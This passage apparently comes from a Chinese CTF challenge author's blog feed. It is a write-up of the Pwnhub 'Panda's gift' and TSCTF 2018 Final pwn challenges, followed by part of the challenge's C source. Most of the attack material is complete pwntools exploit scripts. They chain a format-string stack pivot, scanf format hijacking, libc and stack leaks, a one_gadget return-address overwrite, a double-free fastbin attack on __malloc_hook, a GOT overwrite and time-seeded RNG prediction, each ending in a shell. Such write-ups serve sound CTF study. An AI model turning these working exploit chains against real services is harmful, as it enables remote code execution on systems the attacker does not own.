ZpvJWH6NKq1AVRvrmfyFXLE0obgx44w1amBAb51q/bM0lSrxYZw5MgEq1NYF59C3x6YgL2b3Mggx6l4rk+EfzhyAbWMBFHuMMQxc2fW/HpendLrZ973YDOe+J+novDEQPymhPQlgR1j2S560/S/HlCTfI1lHJE0J97H7eNpy9ssXmmn9jE6McrAkAQ4p4e5o8nxPVlVrNQw/+oxSRJK05+nvLn9e1S/tZ3goD3apliiXrZXmYXD70FyHiRggJxSCFeMWZsAF2gPL2OML/8QgGZuHrM8YG8ov5zBAzKy7L5t94PsQn7GluJyTJAT18xJ3sWfwnDpn4ryyYfq8J/7NsjF4ofs/beMFLLEOx+3OBqX+EdtYRaG0ECNQmdtrvU6enExxJPbDlcQn+6O7wu4zXNYx2OHvcS/zLu+lPPe1Zk4F0CF1z/GX95nG8CXxuZ/pSU2DrjmpHqqpvsOU7Tth4EDer8UngxKBkYSiwZXvwLlya7u95K6hMKu66yUyc3C5roY1gmRLqLNlnrqCZ0BhZdwXz8s7u8lGAgz163sIzPIwLO9HvgsPkniqSUyUichLQwXQXrYItvkbFhnrGmgCythvvZZRCQ04s9j+5AgnxWEYiYIopZUyWK3134PPLYsTcVBpt/dF0SRgvURPWdFjPZmWUNNIBH0Voukaon1jcI6WkRvBs1/NtzFTsGfRCgueHKYk83iLEVqvQWsDExYylABSoskw==]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记]]></title>
    <url>%2F2018%2F06%2F25%2Fpwnhub_Panda's_gift%2F</url>
    <content type="text"><![CDATA[胖哈勃Panda’s gift出题题目分析题目在main函数中首先提高了栈地址，去掉了部分栈地址随机化（后2字节），便于后续利用。 在init函数中，利用时间作为随机数种子，使用mmap伪随机生成2个内存块，地址可预测。作为题目中visitor_name、motto两个变量的可使用内存。 在login函数中，提供了三个功能。1. 向visitor_name赋值，长度最大为6字节。 2. 向motto赋值，长度最大为0x100字节。 3.打印motto的值。 上述三个功能由一个全局变量flag控制每个功能仅能调用一次。 漏洞设置1、 利用libc及固定时间，visitor_name、motto地址可预测。 2、 在login的set_name函数中，设置了一个6字节的格式化字符串漏洞，且漏洞仅能利用一次。 漏洞利用首先，题目在编译时开启了RELRO、NX、CANARY保护，使得got表不可写、不能通过简单溢出利用漏洞。 地址预测在链接远程服务器时同时启动脚本，利用python的cdll库与服务器同样的libc可以达到预测的两个地址的效果，如： 1234567891011121314if not debug: p = remote('127.0.0.1', 9999)#process('./pwn1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')v2 = 0while (v2 &lt;= 0x10000 ): v2 = libc_run.rand() &amp; 0xFFFFF000;visitor_name = v2v2 = 0;while ((v2 &lt;= 0x10000 )|(visitor_name == v2)): v2 = libc_run.rand() &amp; 0xFFFFF000;motto = v2 printf格式化字符串利用因为题目本身仅存在一个显式漏洞，只能从该漏洞入手。 由于仅给了6字节的格式化字符串利用，因此考虑用%hn对rbp链写\x0000。 在0x400d31下断点后，可以看到栈结构如下： 1234567800:0000│ rbp rsp 0x7ffc5dc00110 —▸ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 ◂— ...01:0008│ 0x7ffc5dc00118 —▸ 0x400d47 ◂— nop 02:0010│ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 —▸ 0x7ffc5df09410 ◂— ...03:0018│ 0x7ffc5dc00128 —▸ 0x400eba ◂— jmp 0x400f4b04:0020│ 0x7ffc5dc00130 ◂— 0x005:0028│ 0x7ffc5dc00138 ◂— 0x100400bf806:0030│ 0x7ffc5dc00140 —▸ 0x4010bc ◂— and eax, 0x6e610064 /* &apos;%d&apos; */07:0038│ 0x7ffc5dc00148 ◂— 0xcc345db59e141600 当向rsp所指的位置利用 %6$hn 可以使得在函数返回到login函数时，login的rbp寄存器的后2字节被清零，造成栈迁移。而login函数在调用scanf函数时，使用rbp对格式化字符串寻址： 12345.text:0000000000400E0C mov rax, [rbp+var_10].text:0000000000400E10 mov rsi, rdx.text:0000000000400E13 mov rdi, rax.text:0000000000400E16 mov eax, 0.text:0000000000400E1B call __isoc99_scanf 因此，可以控制scanf格式化字符串的地址。 scanf格式化字符串控制上一条讲了printf格式化字符串利用方法，而在调用printf格式化字符串前，可以利用set_motto函数预先在栈上布置好相关的地址。 tip: 在出题时，我选择用抬高栈的方法使得使用printf格式化字符串利用后修改的rbp一定能落在set_motto使用过的栈中，set_motto从0xxxxxfffd0开始写入到0xxxxx00110结束，但由于栈是复用的，通过对题目调整，使得0xxxxxfffd0 - 0xxxxxffff8是不被栈的复用覆盖的。因此能保证做题时可以劫持栈地址，进一步劫持scanf格式化字符串 在set_motto函数中填入 ‘scanf格式字符串’.ljust(0x20,’0’) + motto的地址，可以将scanf的格式化字符串劫持为用户输入的格式化字符串。且仅有0x20长度 由于栈上没有可以控制数据，所以并不能对内存地址任意写。 scanf的处理特性是按照每一个参数顺序处理的，因此利用栈上的rbp链（第10个参数、第16个参数分别是两个函数栈的ebp位置）特性，构造’%dq%10\$pq%16\$pq\0’，可以达到任意写且能保证正常逻辑不崩溃的目的。 地址泄露当前已经可以构造内存任意写了，任意写劫持motto指针为got地址，可以泄露libc地址。 1p.sendline('3q'+hex(0x602058)+'q'+hex(elf.got['puts'])+'q') 由于flag变量限制，每个函数仅能调用1次，不能继续泄露了，所以对flag置零 1p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q') 使用libc中的environ环境变量，可以泄露栈地址 1p.sendline('3q'+hex(0x602058)+'q'+hex(libc.symbols['environ'])+'q') 劫持控制流由于存在canary，直接栈溢出不能用的，此时劫持控制流可以通过修改调用 text:0000000000400E1B call __isoc99_scanf 处的返回地址，相当于函数自修改返回地址，将其修改为one_gadget，就可以拿到shell了。 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#coding:utf-8from ctypes import *from pwn import *import timedebug=1elf = ELF('./babyfmt')if debug: p= process('./babyfmt') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400d31\nb *0x400e1b\n')else: p = remote('127.0.0.1', 9999)#process('./pwn1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p,'b *0x400e1b\n')v2 = 0while (v2 &lt;= 0x10000 ): v2 = libc_run.rand() &amp; 0xFFFFF000;visitor_name = v2#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);v2 = 0;while ((v2 &lt;= 0x10000 )|(visitor_name == v2)): v2 = libc_run.rand() &amp; 0xFFFFF000;motto = v2#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL); print '[+] motto ',hex(motto) p.recvuntil('&gt;')p.sendline('2')p.recvuntil('motto:')p.sendline('%dq%10$pq%16$pq\0'.ljust(0x20)+p64(motto))p.recvuntil('&gt;')p.sendline('1')p.recvuntil('name')p.sendline('%6$hn')p.recvuntil('&gt;')p.sendline('3q'+hex(0x602058)+'q'+hex(elf.got['puts'])+'q')libc.address = u64(p.recv(6).ljust(8,'\0') )- libc.symbols['puts']print "[+] system",hex(libc.symbols['system'])p.recvuntil('&gt;')p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q')p.recvuntil('&gt;')p.sendline('3q'+hex(0x602058)+'q'+hex(libc.symbols['environ'])+'q')#p.sendline('1q'+hex(libc.symbols['__malloc_hook'])+'q'+hex(libc.address +0x4526a ))#add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))stack = u64(p.recv(6).ljust(8,'\0') ) &amp;0xfffffffffff00000 -0x300000print "[+] stack",hex(stack)p.recvuntil('&gt;')p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q')#p.recvuntil('&gt;')#p.sendline('1q'+hex(motto+12)+'q'+hex(0x007073303824))p.recvuntil('&gt;')p.sendline('1q'+hex(stack+0x128)+'q'+hex(libc.address+0x4526a)+'q')p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' ##other 比赛网址 题目链接 ， 密码： 7nb6 在*ctf 2018里出现过一道scanf格式字符串的利用，那题比较没有canary，使用%256s就溢出执行rop了。见到考察自构格式化字符串的比较少，所以搞了一题，利用思路和bss段上的printf格式化字符串是类似的，结合printf和scanf搞了一个格式化字符串漏洞大礼包。在编译题目时对栈重新构造了一下，避免了做题去碰随机化的尴尬，在scanf格式化字符串长度那里可以再减小一点，我用了15个字节，在题目中预留了32字节的长度。 由于自己太菜了，忘了libc函数是没有canary保护的，在劫持scanf格式化字符串那里本身就可以劫持scanf的返回地址写ROP了，失去了后面跳板构造内存任意写的作用了，如果那里有canary的话只能按照预期的方法来做了。 拿到一血、二血的test_for_pwn、Swings 大佬都是用这个非预期出的，觉得还是有点失落，但大佬们还是真的很强。 不过，这次比赛名称用了Panda’s gift真的是比较暖心了，虽然题目被非预期了，但是还是学到了很多东西。 TSCTF 2018 FINAL PWN1 Writeup此题中留了3处可以获得flag的点 伪随机数预测题目中留了一个black-jack游戏，代码参考了pwnable.kr中题目的代码，但里面的漏洞和逻辑bug被我修复了，每一轮游戏可以下注，当达到一定分数时，可以拿到加密后的flag，此题问题在于初始化中调用了srand(time(0)/60)作为伪随机种子，只要在与服务器上程序启动的一分钟以内去生成随机数都是可以正确预测随机数的。相当于可以预测扑克牌生成的序列，当预测到这一轮电脑会赢的时候就下注$1，预测自己会赢的话就全部下注，过不了几轮就可以拿到加密后的flag，解密就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174#coding:utf-8from pwn import *import timefrom ctypes import *debug=1last = list()ori = -1elf = ELF('./DNS_Server')if debug: libc=CDLL("/lib/x86_64-linux-gnu/libc.so.6") libc.srand(libc.time(0)/60) p= process('./DNS_Server') context.log_level = 'debug' #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p,'b set_motto\nb set_name')else: p = remote('172.16.20.11', 2111)#process('./pwn1') libc = ELF('./libc-2.23.so')def randcard(dealer): global last,ori if len(last)&gt;0: num = last[0]%13+1 last = last[1:] else: ori = libc.rand() num = ori%13+1 if num &gt;= 12: num = 10 elif num == 11: if dealer&lt;=10: num = 11 else: num = 1 else: num = num return numdef round(): global ori player = 0 dealer = 0 player_flag = 0 dealer_flag = 0 Hit = 0 Stay = 0 getrand()#,last player+=randcard(player) #print '--' p.recvuntil('Your Total is ') tmp =int(p.recvline()[:-1]) if (tmp!= player): print '[-] rand num1 wrong !with %d vs %d'%(tmp,player) exit(0) p.recvuntil('The Dealer Has a Total of ') dealer+=randcard(dealer) tmp =int(p.recvline()[:-1]) if (tmp!= dealer): print '[-] rand num2 wrong !%d vs %d'%(tmp,dealer) exit(0) while(1): if player == 21: #print '[+++]1 d,p',dealer,player,last return 1,Hit,Stay if player&lt;=21: if player_flag!=1: card_type = getrand() card_num = randcard(player) if (player + card_num )&lt;=21: player+=card_num Hit +=1 else: last.append(card_type) last.append(ori) player_flag =1 Stay = 1 if dealer&lt;17: dealer += randcard(dealer) if dealer==21: #print '[+++]2 d,p',dealer,player,last return 0,Hit,Stay if dealer&gt;21: #print '[+++]3 d,p',dealer,player ,last return 1,Hit,Stay else: if dealer&lt;17: dealer += randcard(dealer) if dealer&gt;=17: if player&gt;=dealer: #print '[+++]4 d,p',dealer,player ,last return 1,Hit,Stay if player&lt;dealer: #print '[+++]5 d,p',dealer,player ,last return 0,Hit,Stay if dealer&gt;21: #print '[+++]6 d,p',dealer,player ,last return 1,Hit,Stay # (p.recvuntil(Your Total is ))def getrand(): global last_two,last if len(last)&gt;0: num = last[0] last = last[1:] #print '[***]',last else: num = libc.rand() return numwin = 0p.recvuntil('&gt;')p.sendline(str(0xbabe)) p.recvuntil('Y/N')p.sendline('Y')p.recvuntil("Choice:")p.sendline('1')while 1: ''' if win&gt;=6: p.recvuntil('flag :') flag = p.recv() flag_decrypt = "" for i in range(len(flag)): flag_decrypt += chr((getrand()%256)^ord(flag[i])) print flag_decrypt exit(0) ''' if ")b" in p.recvuntil(":"): p.recvuntil('flag :\n') flag = p.recv() flag_decrypt = "" for i in range(len(flag)): flag_decrypt += chr((getrand()%256)^ord(flag[i])) print flag_decrypt exit(0) p.recvuntil(' $') money = int(p.recvline()[:-1]) result,hit,stay = round() if result : p.recvuntil("$") p.sendline(str(money)) for i in range(0,hit): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("H") for i in range(0,stay): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("S") #win+=1 else: p.recvuntil("$") p.sendline(str(1)) for i in range(0,hit): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("H") for i in range(0,stay): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("S") p.recvuntil('Please Enter Y for Yes or N for No\n') p.sendline('Y')p.interactive() Double Free题目中有一个增加DNS和删除DNS的功能，在删除功能中按照domain名进行查找并Free，但仅把最后一个DNS节点指针置空，因此，两次Delete会造成Double Free。但是题目中我设置了一个坑点，在于DNS节点Free以前会检查是否是当前用户释放的，也就是name字段，当简单的double free时，由于fd指针位置已经被置为某地址了，所以不能通过检查而释放，此时发现检查字段用的是strcmp来比较的，将name字段设置为‘\x00’*7即可通过检查。比较简单的libc泄露地址方法是用unsorted bin未清空来做，泄露main_arena+88这个地址。以后的方法是常规套路：将Double Free转换为UAF，形成循环链表，劫持长度为0x70的fastbin链到__malloc_hook-0x30，以one_gadget覆写__malloc_hook，在申请堆块时候触发malloc从而拿到shell。 另外，堆漏洞由于我写错了一个函数，出现了一个堆溢出漏洞，膜一发以非预期解法解出题目的师傅 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#coding:utf-8from pwn import *import timedebug=1elf = ELF('./DNS_Server')if debug: p= process('./DNS_Server') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p)else: p = remote('172.16.20.11', 2111)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(domain,length,remark,ip): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("domain:") p.sendline(domain) p.recvuntil("length") p.sendline(str(length)) p.recvuntil("remark:") p.sendline(remark) p.recvuntil("IP:") p.send(ip)def delete(domain): p.recvuntil("&gt;") p.sendline("4") p.recvuntil("domain:") p.sendline(domain)def show(domain): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("domain:") p.sendline(domain)def leak(): add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) delete("leak") show("leak")leak()p.recvuntil("IP : ")libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols["__malloc_hook"]print '[+] system:',hex(libc.symbols['system'])p.recvuntil("IP : ")heap =u64(p.recv(4).ljust(8,'\0'))print '[+] heap:',hex(heap)p.recvuntil("&gt;")p.sendline('1')p.recvuntil('&gt;')p.sendline('1')p.recvuntil("name")p.sendline('\0'*6)p.recvuntil("&gt;")p.sendline('4')add("leak",0x100,"p4nda","...12345".ljust(0x20,'b'))add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b'))#raw_input()add("step1",0x40,"p4nda","...".ljust(0x20,'1'))add("step1",0x40,"p4nda","...".ljust(0x20,'1'))delete("step1")delete("step1")delete("leak")#raw_input()add("step2",0x40,"p4nda",(p64(libc.symbols['__malloc_hook']-0x23)+"...").ljust(0x20,'1'))add("step3",0x40,"p4nda","...".ljust(0x20,'3'))add("step3",0x40,"p4nda","...".ljust(0x20,'3'))#raw_input()add("step4",0x40,"p4nda",("\0"*0x13+p64(libc.address +0x4526a )+"...".ljust(0x20,'0')))p.recvuntil("&gt;")p.sendline("2")p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' 格式化字符串大礼包在set_name函数中有一个明显的格式化字符串漏洞，这个漏洞很多队伍拿来做地址泄露了，实际上也是可用的。首先七个字节，可用来写本函数中的rbp，向该位置用%hn写2字节\x00。在写完之后，在login函数的栈就被迁移到原来的栈的低地址位置了，而在set_motto函数中可以对这部分内存预先设置一下，可以达到控制scanf格式化字符串的目的，将这个格式化字符串劫持到堆上去，泄露堆地址的方法与Double Free中泄露方法是一致的，达到控制格式化字符串以后，需要考虑如何将scanf的格式化字符串用好。与格式化字符串在堆或bss段上的printf格式化字符串利用思路类似，可以在栈上先找一个地址链，向第一个地址写入，再对第二个地址写入，从而达到任意地址写，最终劫持puts@got 为system，以show_motto函数触发漏洞就可以拿到shell了。 利用流程是：以堆泄露libc、堆地址-&gt;在堆上预先布置好scanf格式化字符串-&gt;以set_motto预先布置好栈上数据-&gt;调用set_name对login函数做栈迁移-&gt;利用login函数的scanf写got表-&gt;触发show_motto函数拿到shell 这个就是一个简化版本的胖哈勃题目，出在这里想看一下有什么解法是我非预期的，当时线下赛的时候没有人用这个方法来做，还是没有想到上面提到的那个劫持返回地址… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf-8from pwn import *import timedebug=0elf = ELF('./DNS_Server')if debug: p= process('./DNS_Server') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b set_motto\nb set_name')else: p = remote('172.16.20.17', 40111)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(domain,length,remark,ip): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("domain:") p.sendline(domain) p.recvuntil("length") p.sendline(str(length)) p.recvuntil("remark:") p.sendline(remark) p.recvuntil("IP:") p.send(ip)def delete(domain): p.recvuntil("&gt;") p.sendline("4") p.recvuntil("domain:") p.sendline(domain)def show(domain): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("domain:") p.sendline(domain)def leak(): add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) delete("leak") show("leak")leak()p.recvuntil("IP : ")libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols["__malloc_hook"]print '[+] system:',hex(libc.symbols['system'])p.recvuntil("IP : ")heap =u64(p.recv(4).ljust(8,'\0'))print '[+] heap:',hex(heap)add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))p.recvuntil('&gt;')p.sendline('1') p.recvuntil('&gt;')p.sendline('2')p.recvuntil('motto:')for i in range(0,8): if(((heap+48)&gt;&gt;(8*i))&amp;0xff) ==0x0a: print "bad addr" exit(0)p.sendline('/bin/sh\0'+'a'*(0xf0-0x10-8)+p64(heap+48))p.recvuntil('&gt;')p.sendline('1')p.recvuntil('name')p.sendline('%6$hn')p.recvuntil("&gt;")p.sendline("3p4nda"+hex(elf.got['puts'])+"p4nda"+hex(libc.symbols['system'])+'p4nda')p.recvuntil('motto')p.sendline('p4nda')p.interactive() 题目源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034103510361037103810391040104110421043104410451046104710481049105010511052105310541055105610571058105910601061106210631064106510661067106810691070107110721073107410751076107710781079108010811082108310841085108610871088108910901091109210931094109510961097109810991100110111021103110411051106110711081109111011111112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt; //Used for srand((unsigned) time(NULL)) command//#include &lt;process.h&gt; //Used for system("cls") command #define spade 35 //Used to print spade symbol#define club 36 //Used to print club symbol#define diamond 37 //Used to print diamond symbol#define heart 38 //Used to print heart symbol#define RESULTS "Blackjack.txt" //File name is Blackjack#define WIN_SUM 65535 struct DNS_Node&#123; char user[8]; char domain[0x30]; char *ptr;&#125;;//Global Variablesint k;int l;int d;int won;int loss;int cash = 5;unsigned int bet;int random_card;int player_total=0;int dealer_total=0;char * visitor_name ;int login_flag=0;char * motto=0;struct DNS_Node *DNS_Node_List[0x20];//Function Prototypesint clubcard(); //Displays Club Card Imageint diamondcard(); //Displays Diamond Card Imageint heartcard(); //Displays Heart Card Imageint spadecard(); //Displays Spade Card Imageint randcard(); //Generates random cardint betting(); //Asks user amount to betvoid asktitle(); //Asks user to continuevoid rules(); //Prints "Rules of Vlad's Blackjack" menuvoid play(); //Plays gamevoid dealer(); //Function to play for dealer AIvoid stay(); //Function for when user selects 'Stay'void cash_test(); //Test for if user has cash remaining in pursevoid askover(); //Asks if user wants to continue playingvoid fileresults(); //Prints results into Blackjack.txt file in program directory//Main Functionint game(void)&#123; int choice1; puts("-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"); printf("\n"); printf("\n"); printf("\n"); printf("\n 222 111 "); printf("\n 222 222 11111 "); printf("\n 222 222 11 111 "); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n"); printf("\n%c%c%c%c%c %c%c %c%c %c%c%c%c%c %c %c ", club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, club, club); printf("\n%c%c%c%c%c %c%c %c %c%c %c %c %c %c ", club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club); printf("\n%c %c %c%c %c %c%c%c%c %c %c %c%c %c ", club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club); printf("\n%c %c %c%c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, heart, club, club); printf("\n%c%c%c%c%c%c %c%c%c%c%c%c%c %c %c %c%c%c%c%c %c %c ", club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club); printf("\n"); printf("\n 21 "); printf("\n %c%c%c%c%c%c%c%c %c%c %c%c%c%c%c %c %c ", diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade); printf("\n %c%c %c %c %c %c %c %c ", diamond, diamond, heart, heart, club, club, spade, spade); printf("\n %c%c %c %c %c %c %c ", diamond, diamond, heart, heart, club, spade, spade); printf("\n %c%c %c %c%c %c %c %c %c ", diamond, diamond, heart, heart, heart, heart, club, spade, spade); printf("\n %c%c %c %c%c%c%c %c %c %c%c %c ", diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade); printf("\n %c%c %c %c %c %c %c ", diamond, diamond, heart, heart, club, spade, spade); printf("\n %c %c%c %c %c %c %c %c %c ", diamond, diamond, diamond, heart, heart, club, spade, spade); printf("\n %c%c%c %c %c %c%c%c%c%c %c %c ", diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade); printf("\n"); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n 222222222222222 111111111111111 "); printf("\n 2222222222222222 11111111111111111 "); printf("\n"); puts("-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"); printf("\n"); asktitle(); printf("\n"); printf("\n"); //system("pause"); return(0);&#125; //end program void asktitle() // Function for asking player if they want to continue&#123; char choice1; int choice2; printf("\n Are You Ready?"); printf("\n ----------------"); printf("\n (Y/N)\n "); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu. &#123; //system("clear"); printf("\nEnter 1 to Begin the Greatest Game Ever Played."); printf("\nEnter 2 to See a Complete Listing of Rules."); printf("\nEnter 3 to Exit Game. (Not Recommended)"); printf("\nChoice: "); scanf("%d", &amp;choice2); // Prompts user for choice if((choice2&lt;1) || (choice2&gt;3)) // If invalid choice entered &#123; printf("\nIncorrect Choice. Please enter 1, 2 or 3\n"); scanf("%d", &amp;choice2); &#125; switch(choice2) // Switch case for different choices &#123; case 1: // Case to begin game // system("clear"); play(); break; case 2: // Case to see rules // system("clear"); rules(); break; case 3: // Case to exit game printf("\nYour day could have been perfect."); printf("\nHave an almost perfect day!\n\n"); //system("pause"); exit(0); break; default: printf("\nInvalid Input"); &#125; // End switch case &#125; // End if loop else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program &#123; printf("\nYour day could have been perfect."); printf("\nHave an almost perfect day!\n\n"); //system("pause"); exit(0); &#125; return;&#125; // End function void rules() //Prints "Rules of Vlad's Blackjack" list&#123; char choice1; int choice2; printf("\n RULES of VLAD's BLACKJACK"); printf("\n ---------------------------"); printf("\nI."); printf("\n Thou shalt not question the odds of this game."); printf("\n %c This program generates cards at random.", spade); printf("\n %c If you keep losing, you are very unlucky!\n", diamond); printf("\nII."); printf("\n Each card has a value."); printf("\n %c Number cards 1 to 10 hold a value of their number.", spade); printf("\n %c J, Q, and K cards hold a value of 10.", diamond); printf("\n %c Ace cards hold a value of 11", club); printf("\n The goal of this game is to reach a card value total of 21.\n"); printf("\nIII."); printf("\n After the dealing of the first two cards, YOU must decide whether to HIT or STAY."); printf("\n %c Staying will keep you safe, hitting will add a card.", spade); printf("\n Because you are competing against the dealer, you must beat his hand."); printf("\n BUT BEWARE!."); printf("\n %c If your total goes over 21, you will LOSE!.", diamond); printf("\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n", spade, heart, club, club, heart, spade); printf("\nWould you like to go the previous screen? (I will not take NO for an answer)"); printf("\n (Y/N)\n "); scanf("\n%c",&amp;choice1); while((choice1!='Y') 